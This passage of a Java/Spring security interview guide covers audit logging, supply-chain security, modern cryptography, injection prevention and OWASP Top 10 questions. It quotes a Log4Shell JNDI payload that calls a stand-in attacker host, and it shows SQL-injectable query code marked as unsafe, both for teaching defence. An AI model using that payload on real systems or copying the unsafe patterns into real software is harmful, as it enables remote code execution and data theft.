    }

    @EventListener
    public void onAccessDenied(AuthorizationDeniedEvent event) {
        Authentication auth = event.getAuthentication().get();
        auditLog.warn("ACCESS_DENIED user={} resource={}",
            auth.getName(), event.getSource());
    }
}
```

Key audit logging principles:
- **Log authentication events**: successful logins, failed logins, logouts, password changes
- **Log authorization failures**: access denied events
- **Log sensitive operations**: user creation/deletion, role changes, data exports
- **Never log secrets**: passwords, tokens, API keys, PII in plaintext
- **Use structured logging**: JSON format for easy parsing by SIEM tools
- **Set up alerts**: multiple failed logins, unusual access patterns, privilege escalation

### Dependency Scanning

Vulnerable dependencies are one of the most common attack vectors. Regularly scan and update:

| Tool | Type | Integration |
|------|------|-------------|
| **OWASP Dependency-Check** | Maven/Gradle plugin | Build pipeline, blocks on CVEs |
| **Snyk** | SaaS + CLI | GitHub integration, PR checks |
| **GitHub Dependabot** | Built into GitHub | Automatic PRs for updates |
| **Trivy** | Container scanner | Docker images, IaC |
| **grype** | SBOM-based SCA | Works with CycloneDX / SPDX |
| **Sonatype Nexus IQ / JFrog Xray** | Enterprise SCA | Artifact-repo gating |

```xml
<!-- Maven: OWASP Dependency-Check plugin (v12.x, 2026) -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>12.2.0</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS> <!-- Fail on High/Critical -->
        <nvdApiKey>${env.NVD_API_KEY}</nvdApiKey> <!-- NVD API key required since 2024 -->
    </configuration>
    <executions>
        <execution>
            <goals><goal>check</goal></goals>
        </execution>
    </executions>
</plugin>
```

---

## 12. Software Supply Chain Security (OWASP A03:2025)

### Why This Became a Top-Level Category

**Log4Shell (CVE-2021-44228, December 2021)** was the watershed. Apache Log4j2 had a JNDI lookup feature in its pattern formatter: any logged string containing `${jndi:ldap://attacker.com/x}` would trigger an LDAP lookup and load an arbitrary remote class — unauthenticated RCE from a single HTTP header. Three factors made it catastrophic:
1. **Ubiquity** — Log4j was embedded in thousands of products, often as a transitive dependency invisible to dependency scanners that only looked at top-level declarations.
2. **Ease of exploitation** — any log line with user-controlled input was a trigger; `User-Agent`, `X-Forwarded-For`, and usernames all worked.
3. **Visibility gaps** — organizations could not answer "where is Log4j running in our stack?" in hours, let alone in the 24 hours they had before mass exploitation.

The follow-on events — **Spring4Shell** (CVE-2022-22965), the **3CX / SolarWinds** build-system compromises, **xz-utils** backdoor (CVE-2024-3094), malicious npm/PyPI typosquats — crystallized the new threat model: **the build system and the dependency graph are now part of the attack surface.**

Practical senior-engineer response:
- Maintain a real inventory (SBOM) of every production artifact
- Verify build provenance cryptographically (Sigstore / SLSA)
- Treat a `log4j` zero-day drill as a routine tabletop exercise

### SBOM (Software Bill of Materials)

An SBOM is a machine-readable list of every component in a build artifact: direct dependencies, transitive dependencies, OS packages, license info, cryptographic hashes, and provenance. The two dominant formats:

| Format | Origin | Strength |
|--------|--------|----------|
| **CycloneDX** | OWASP | Lightweight, security-focused, includes vulnerability and VEX data |
| **SPDX** | Linux Foundation / ISO 5962 | Licensing-focused, required by US federal procurement per EO 14028 |

```xml
<!-- Maven: CycloneDX SBOM plugin -->
<plugin>
    <groupId>org.cyclonedx</groupId>
    <artifactId>cyclonedx-maven-plugin</artifactId>
    <version>2.8.0</version>
    <executions>
        <execution>
            <phase>package</phase>
            <goals><goal>makeAggregateBom</goal></goals>
        </execution>
    </executions>
</plugin>
```

Pair the SBOM with a scanner like `grype sbom:bom.json` in CI. When the next Log4Shell drops, you answer the "are we affected?" question in minutes by grepping the SBOMs of every deployed service.

### SLSA — Supply-chain Levels for Software Artifacts

SLSA (pronounced "salsa") is a Google/OpenSSF framework that defines progressively stronger guarantees about how an artifact was built. Each level is a verifiable property of your build pipeline:

| Level | Guarantee | Example |
|-------|-----------|---------|
| **SLSA 1** | Build process is scripted and produces provenance | GitHub Actions workflow emits a provenance file |
| **SLSA 2** | Build is run on a hosted service; provenance is signed | Build on GitHub-hosted runners; provenance signed by GitHub OIDC |
| **SLSA 3** | Build is isolated and non-forgeable | Hermetic build, no network after fetch, auditable build service |

### Sigstore — Keyless Signing

Sigstore (Linux Foundation) replaced the old "keep a GPG key in a safe" workflow with **keyless, short-lived certificates tied to OIDC identities**.

Three moving parts:
- **Cosign** — CLI to sign and verify container images, binaries, and blobs
- **Fulcio** — CA that issues short-lived (10-minute) X.509 certificates tied to an OIDC identity (GitHub Actions, Google, email)
- **Rekor** — append-only transparency log that records every signing event publicly

```bash
# Sign a Docker image keylessly — identity comes from GitHub Actions OIDC token
cosign sign --yes ghcr.io/myorg/myapp@sha256:abc123...

# Verify — ensures build came from expected repo + workflow
cosign verify ghcr.io/myorg/myapp@sha256:abc123... \
    --certificate-identity "https://github.com/myorg/myapp/.github/workflows/release.yml@refs/heads/main" \
    --certificate-oidc-issuer "https://token.actions.githubusercontent.com"
```

### End-to-End Hardened Pipeline (senior-level reference design)

1. **Pin dependencies** — lock versions in `pom.xml` / `gradle.lockfile`; no version ranges
2. **Use internal repository mirror** (Nexus, Artifactory) with a vulnerability gate blocking ingestion of CVE-laden artifacts
3. **Hermetic build** — no outbound network during `mvn package` except to the mirror
4. **Generate SBOM** (CycloneDX) at package time, attach to the artifact
5. **Sign artifact** with Cosign using CI OIDC identity (keyless)
6. **Generate SLSA v1 provenance** attestation, sign, push to Rekor
7. **Admission controller** on Kubernetes (e.g., Connaisseur, Kyverno) verifies Cosign signature + provenance before running the pod
8. **Runtime scan** — Trivy / Falco watch for known-bad behavior
9. **Continuous SCA** — Dependabot / Renovate opens PRs for CVE bumps; critical CVEs auto-merge with tests

---

## 13. Java Cryptography — Modern APIs and Post-Quantum

### What Changed in JDK 21–24

| Change | JEP / Version | Senior-interview relevance |
|--------|---------------|----------------------------|
| **Security Manager permanently disabled** | [JEP 486](https://openjdk.org/jeps/486), Java 24 | You cannot call `System.setSecurityManager()` — it throws `UnsupportedOperationException`. Do not propose Security Manager as a sandbox in interview answers; it is gone. Stub `java.lang.SecurityManager` remains only for compile-time compatibility |
| **Key Derivation Function API** | [JEP 478](https://openjdk.org/jeps/478) (preview, Java 24) → [JEP 510](https://openjdk.org/jeps/510) (final, Java 25) | First-class `javax.crypto.KDF` API. HKDF in 24, Argon2/scrypt in 25 |
| **ML-KEM (Kyber)** key encapsulation | [JEP 496](https://openjdk.org/jeps/496), Java 24 | Post-quantum KEM for key exchange (FIPS 203) |
| **ML-DSA (Dilithium)** signatures | [JEP 497](https://openjdk.org/jeps/497), Java 24 | Post-quantum signatures (FIPS 204) |
| **Hybrid PQ Key Exchange for TLS 1.3** | [JEP 527](https://openjdk.org/jeps/527), targeted Java 26 | `X25519MLKEM768` cipher in TLS — classical ECDH + ML-KEM so you are safe if either side breaks |
| **ML-DSA JAR signing** | Planned JDK 26 (March 2026) | `jarsigner` will support ML-DSA |
| **`SecureRandom` defaults** | Unchanged but worth knowing | Prefer `SecureRandom.getInstanceStrong()`; on Linux this blocks on `/dev/random` entropy — cache the instance |
| **Deprecated algorithms** | TLS 1.0/1.1 disabled by default since JDK 11; 3DES, DES, MD5 signatures disabled via `jdk.tls.disabledAlgorithms` | Interviewers ask about reading `java.security` properties to audit disabled algorithms |

### Post-Quantum Cryptography (PQC) — why care now

"Harvest now, decrypt later" — adversaries record encrypted traffic today, decrypt it in 10–20 years when a cryptographically relevant quantum computer exists. Any long-lived secret (medical records, classified comms, signed software) needs PQ protection **before** the quantum threat materializes. NIST standardized the first PQ algorithms in 2024 (FIPS 203/204/205), and CNSA 2.0 mandates PQ transition for US national-security systems by 2033.

```java
// Java 24 — generate an ML-KEM key pair (post-quantum key encapsulation)
KeyPairGenerator kpg = KeyPairGenerator.getInstance("ML-KEM-768");
KeyPair kp = kpg.generateKeyPair();

// Encapsulate: produces a shared secret + ciphertext
KEM kem = KEM.getInstance("ML-KEM");
KEM.Encapsulator encapsulator = kem.newEncapsulator(kp.getPublic());
KEM.Encapsulated encapsulated = encapsulator.encapsulate();
SecretKey sharedSecret = encapsulated.key();
byte[] ciphertext = encapsulated.encapsulation();

// Decapsulate on the recipient side
KEM.Decapsulator decapsulator = kem.newDecapsulator(kp.getPrivate());
SecretKey recoveredSecret = decapsulator.decapsulate(ciphertext);
```

**Hybrid is the 2026 recommended pattern** — combine a classical algorithm (ECDH/RSA) with a PQ one (ML-KEM). If either breaks, the combined secret is still safe. This is exactly what JEP 527 delivers for TLS 1.3.

### Symmetric Encryption — Safe Defaults

```java
// AES-256-GCM — authenticated encryption, use this by default
SecretKey key = KeyGenerator.getInstance("AES").generateKey(); // 256-bit
byte[] iv = new byte[12];               // 96-bit IV for GCM
SecureRandom.getInstanceStrong().nextBytes(iv);

Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
cipher.updateAAD(associatedData);        // authenticated but not encrypted
byte[] ciphertext = cipher.doFinal(plaintext);
// Store iv + ciphertext; NEVER reuse (iv, key) pair
```

**Do not use:**
- `AES/ECB/*` — leaks plaintext patterns
- `AES/CBC/*` without HMAC — padding oracle attacks
- DES, 3DES, Blowfish, RC4
- SHA-1 for signatures
- `MessageDigest` equality via `Arrays.equals` on MACs — use `MessageDigest.isEqual` (constant-time)

---

## 14. Input Validation and Injection Prevention

### Bean Validation (Jakarta Validation API 3.1)

Jakarta Bean Validation (formerly javax.validation, now `jakarta.validation`) is the Spring/Jakarta EE standard. Use **allowlist validation** on every DTO — a missing constraint is the bug, not the presence of an odd input.

```java
public record CreateUserRequest(
    @NotBlank @Size(min = 3, max = 32)
    @Pattern(regexp = "^[a-zA-Z0-9_-]+$", message = "Alphanumerics, _, - only")
    String username,

    @NotBlank @Email @Size(max = 254)
    String email,

    @NotBlank @Size(min = 12, max = 128)
    String password,

    @Min(18) @Max(120)
    int age,

    @URL @Size(max = 2048)
    String website
) {}

@PostMapping("/users")
public User create(@Valid @RequestBody CreateUserRequest req) { ... }

// For collections: @Valid on the field, and constraints inside the bean
public record BulkRequest(@NotEmpty @Size(max = 1000) List<@Valid Item> items) {}
```

Add `@ControllerAdvice` for a uniform 400 response on `MethodArgumentNotValidException` — do not echo field values back verbatim (XSS risk in error payloads).

### SQL Injection — JPA Gotchas

JPA/Hibernate is safe **if used correctly**. Senior interview trap cases:

```java
// SAFE — JPQL with named parameters
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmail(@Param("email") String email);

// SAFE — Criteria API, parameters bound
cb.equal(root.get("email"), email);

// UNSAFE — dynamic JPQL via string concat (happens often in "search" endpoints)
em.createQuery("SELECT u FROM User u WHERE u.name = '" + name + "'");

// UNSAFE — @Query with SpEL interpolation, nativeQuery
@Query(value = "SELECT * FROM users WHERE name = :#{#name}", nativeQuery = true)
// ^ :#{#name} still binds a parameter; fine. But below is not:
@Query(value = "SELECT * FROM users ORDER BY :#{#sortField}", nativeQuery = true)
// Column names cannot be parameters — validate against an allowlist enum instead

// UNSAFE — Spring Data custom method with @Query doing string ops
// Example: LIKE '%' || :search || '%' with unescaped % or _ in search causes
// performance issues but not injection; still escape them.
```

For truly dynamic queries (filters, sort), use the **Specification API** or **jOOQ**, which both generate parameterized SQL.

### Command / Path / LDAP / XPath Injection

- **OS command** — use `ProcessBuilder(List<String>)` (array form, not shell string). Never concatenate user input into `sh -c`.
- **Path traversal** — resolve against a canonical base and verify with `Path.startsWith`: see section 7 above.
- **LDAP** — escape per RFC 4515, or use `javax.naming.ldap.Rdn.escapeValue()`.
- **XPath / XML** — use parameterized XPath (`javax.xml.xpath.XPath.setXPathVariableResolver`), never string-concat.
- **SpEL / OGNL / Thymeleaf templates** — never render user input into a template as an expression. Spring's `@Value("${...}")` resolves once at context load — safe; `@Value("#{...}")` evaluates SpEL — never feed it user input.

---

## 15. Common Senior Interview Questions

**Q1: How would you design authentication and authorization for a microservices architecture?**

Use a centralized **authorization server** (Keycloak, Auth0) that issues JWTs. Each microservice acts as a **resource server** that validates tokens locally using the authorization server's public key (JWKS endpoint). For service-to-service calls, use the **Client Credentials** grant type. Propagate user context by forwarding the JWT or extracting claims and passing them in internal headers. Use an **API Gateway** as the single entry point that validates tokens and handles rate limiting. For fine-grained authorization, each service enforces its own permissions based on JWT claims (roles, scopes). Use **mTLS** between services for transport-level authentication in zero-trust environments.

**Q2: Explain the difference between stateful (session-based) and stateless (token-based) authentication. When would you use each?**

**Session-based**: Server creates a session object stored in memory or a session store (Redis). Client receives a session ID cookie. Server looks up the session on every request. Advantages: easy revocation (delete session), small cookie size. Disadvantages: server-side state, horizontal scaling requires shared session store (sticky sessions or Redis).

**Stateless (JWT)**: Server issues a signed token containing all necessary data. Client sends the token with each request. Server validates the signature without any lookup. Advantages: no server-side state, easy horizontal scaling, works across services. Disadvantages: hard to revoke (need blacklists), larger request size, cannot be invalidated before expiry without additional infrastructure.

Use session-based for traditional server-rendered web apps. Use JWT for APIs, microservices, SPAs, and mobile apps. Many production systems use a hybrid: short-lived JWTs for API access combined with server-side refresh token storage for revocation capability.

**Q3: A security audit found that your application is vulnerable to SQL injection. Walk me through how you would remediate this across the codebase.**

1. **Identify all database interactions**: search for raw SQL string construction, `Statement` usage (vs `PreparedStatement`), and JPQL/HQL string concatenation.
2. **Replace with parameterized queries**: use `PreparedStatement` with `?` placeholders for JDBC, named parameters with `@Param` for Spring Data JPA, and `CriteriaBuilder` for dynamic queries.
3. **Audit ORM usage**: even with JPA, native queries built with concatenation are vulnerable. Review all `@Query(nativeQuery=true)` annotations.
4. **Add static analysis**: integrate tools like SpotBugs with the FindSecBugs plugin or SonarQube to detect SQL injection patterns in CI/CD.
5. **Apply defense-in-depth**: use a WAF (Web Application Firewall) for an additional layer, apply least-privilege database permissions (read-only accounts for read operations), and implement input validation as a secondary defense (not primary -- parameterized queries are the real fix).
6. **Write tests**: create test cases that attempt SQL injection payloads and verify they are safely handled.

**Q4: How does CSRF protection work, and when can it be safely disabled?**

CSRF exploits the browser's automatic inclusion of cookies on cross-origin requests. Protection works by requiring a secret token (CSRF token) that the attacker's page cannot know. The server generates a token and embeds it in the form or provides it via a cookie. On form submission, the server validates that the token matches.

CSRF protection can be safely disabled when:
- The API uses **stateless authentication** (JWT in Authorization header, not cookies) -- if no cookies carry authentication, CSRF is not possible
- The API only accepts `Content-Type: application/json` -- browsers cannot send JSON via simple form submission (requires preflight, which is blocked by CORS)
- All cookies use `SameSite=Strict` or `SameSite=Lax` -- the browser itself prevents cross-origin cookie sending

It should NOT be disabled for traditional form-based web applications that use session cookies.

**Q5: How do you handle secret rotation in a production system without downtime?**

1. **Support multiple active secrets**: design the system to accept the current AND previous secret simultaneously during rotation. For JWT signing keys, publish both old and new public keys in the JWKS endpoint.
2. **Use a secrets manager with rotation**: HashiCorp Vault or AWS Secrets Manager can generate new credentials and update consumers automatically. Vault's dynamic secrets have TTLs and are auto-revoked.
3. **Staged rollout**: deploy the new secret, wait for all instances to pick it up (Spring Cloud Vault refreshes periodically), then deactivate the old secret.
4. **Database credential rotation**: use Vault's database secrets engine to generate short-lived credentials per application instance. When rotating, Vault creates new credentials and revokes old ones after a grace period.
5. **Monitor and alert**: log all secret access, alert on use of deprecated/old secrets, track rotation completion across all services.

**Q6: What is the OWASP Top 10, and how does each item apply to a Java/Spring application?**

The **OWASP Top 10:2025** (released November 6, 2025, based on analysis of 175,000+ CVEs) is the current reference. Senior interviewers expect you to know both the 2025 list *and* what changed versus 2021:

| # | 2025 Category | Change vs 2021 | Java/Spring manifestation |
|---|---------------|----------------|---------------------------|
| A01 | **Broken Access Control** | Unchanged (#1). SSRF (was A10 in 2021) folded in | Missing `@PreAuthorize`, IDOR (`/users/{id}` without ownership check), flawed `AuthorizationManager`, SSRF against internal services / cloud metadata endpoints |
| A02 | **Security Misconfiguration** | **Up from #5** | Default credentials, actuator endpoints exposed, verbose stack traces, CORS wildcard `*`, CSRF disabled on cookie-based apps, TLS with legacy ciphers, Spring dev tools in prod |
| A03 | **Software Supply Chain Failures** | **New category (expanded from "Vulnerable Components")** | Transitive dependency CVEs (Log4Shell, Spring4Shell), malicious npm/Maven packages, unpinned Docker base images, CI/CD pipeline compromise, build-time code injection, unsigned artifacts |
| A04 | **Cryptographic Failures** | Down from #2 | MD5/SHA-1 for passwords, hardcoded keys, missing HTTPS, using ECB mode, weak JWT secrets, not using a KDF (see JEP 478) |
| A05 | **Injection** | Down from #3. Includes XSS | SQL injection via `Statement` concatenation, OS command injection via `ProcessBuilder` / legacy `Runtime` APIs with user input, LDAP injection, SpEL/OGNL injection, template injection (Thymeleaf `th:utext`), header injection |
| A06 | **Insecure Design** | Down from #4 | Missing rate limiting, no account lockout, password reset flow that reveals account existence, business logic flaws, lack of threat modeling |
| A07 | **Authentication Failures** | Unchanged (#7), renamed | Weak passwords, missing MFA, session fixation, credential stuffing without bot protection, JWT algorithm confusion, OAuth implicit flow still in use |
| A08 | **Software and Data Integrity Failures** | Unchanged position | Insecure Java deserialization, unsigned JARs, auto-update without signature verification, CI/CD pipeline tampering, reliance on untrusted CDN scripts (use SRI) |
| A09 | **Security Logging & Alerting Failures** | Unchanged (#9), renamed | No audit logs, logging PII/secrets, no alerting on anomalies, logs not centralized, retention too short for incident forensics |
| A10 | **Mishandling of Exceptional Conditions** | **New category (24 CWEs)** | Failing open on exception (e.g., returning `true` from auth check on error), swallowed exceptions hiding tampering, leaking internal paths in error pages, race conditions in error paths |

Key takeaways senior engineers flag:
- **SSRF is now part of A01** — validate URLs, block loopback/link-local/metadata ranges, use an egress allowlist
- **Supply chain got its own category (A03)** — you must be able to produce an SBOM, sign artifacts, and verify build provenance
- **A10 (fail-safe defaults)** is new — your error paths must default to *denying* access, not allowing

**Q7: Explain how you would implement rate limiting for a distributed system.**

For distributed systems, local in-memory rate limiting is insufficient because requests are spread across multiple instances. Options:

1. **Token Bucket in Redis**: use a shared Redis store with atomic operations (Lua scripts or Redis modules like `redis-cell`). Libraries like Bucket4j support Redis as a backend. Each request checks/decrements the bucket atomically.
2. **Fixed Window Counter**: increment a Redis counter with key `rate:{clientId}:{minute}` and TTL. Simple but has burst issues at window boundaries.
3. **Sliding Window Log**: store timestamps of each request in a Redis sorted set. Count entries within the window. More accurate but more memory.
4. **API Gateway level**: Kong, AWS API Gateway, or Envoy provide built-in distributed rate limiting backed by Redis.

Key considerations: rate limit by user ID (authenticated), IP address (unauthenticated), and API key. Return `429 Too Many Requests` with `Retry-After` header. Use different limits for different endpoints (login stricter than read). Apply rate limiting before expensive operations (authentication, database queries).

**Q8: What is the difference between encryption at rest and encryption in transit? How do you implement both in a Java application?**

**Encryption in transit**: protects data as it moves between systems. Implemented via TLS/HTTPS. In Spring Boot, configure `server.ssl.*` properties. For service-to-service calls, use mTLS. For message queues, enable TLS on the broker connection.

**Encryption at rest**: protects stored data (databases, files, backups). Implemented at multiple levels:
- **Application level**: encrypt sensitive fields before storing (using AES-256-GCM via `javax.crypto.Cipher` or Vault's transit engine). Gives most control but adds complexity.
- **Database level**: Transparent Data Encryption (TDE) in PostgreSQL, MySQL. Encrypts data files on disk. No application changes needed.
- **Storage level**: encrypted EBS volumes, S3 server-side encryption (SSE-S3, SSE-KMS). Simplest, protects against physical theft.

Best practice is **defense in depth** -- apply encryption at multiple levels. Manage encryption keys separately from the encrypted data (use KMS, Vault).

**Q9: How would you prevent and detect a compromised JWT in production?**

Prevention:
- Use short-lived access tokens (5-15 minutes)
- Use HttpOnly, Secure, SameSite cookies for token storage
- Sign with strong keys (RS256 with 2048+ bit keys)
- Include `jti` claim for unique identification
- Bind tokens to client (include client fingerprint hash in claims)
- Always validate `iss`, `aud`, `exp`, and signature

Detection:
- Monitor for tokens used from unusual IP addresses or geolocations
- Track concurrent usage of same token from different IPs
- Implement refresh token rotation -- reuse detection triggers family revocation
- Log all authentication events and set up anomaly alerts
- Use token introspection for high-security endpoints

Response to compromise:
- Revoke all refresh tokens for the affected user
- Add the compromised token's `jti` to a blacklist (cached in Redis)
- Force re-authentication
- Rotate signing keys if the key itself is compromised (publish new JWKS, keep old key for validation during transition)

**Q10: How do you implement security in a CI/CD pipeline?**

1. **Secret management**: never store secrets in code or pipeline configs. Use pipeline-native secrets (GitHub Actions secrets, GitLab CI variables) injected as environment variables. For complex setups, fetch from Vault at build time.
2. **Static analysis (SAST)**: run SonarQube or Semgrep on every PR. Block merges on critical/high findings.
3. **Dependency scanning (SCA)**: run OWASP Dependency-Check or Snyk in the build. Fail the pipeline on known critical CVEs.
4. **Container scanning**: scan Docker images with Trivy or Grype before pushing to registry.
5. **Infrastructure as Code scanning**: scan Terraform/CloudFormation with Checkov or tfsec for misconfigurations.
6. **Signed artifacts**: sign build artifacts and container images. Verify signatures before deployment.
7. **Least privilege**: pipeline service accounts should have minimal permissions. Use OIDC federation instead of long-lived credentials where possible.
8. **Branch protection**: require PR reviews, status checks passing, and signed commits on main/release branches.
9. **Audit trail**: log all deployments, who triggered them, and what was deployed. Use immutable deployment artifacts.
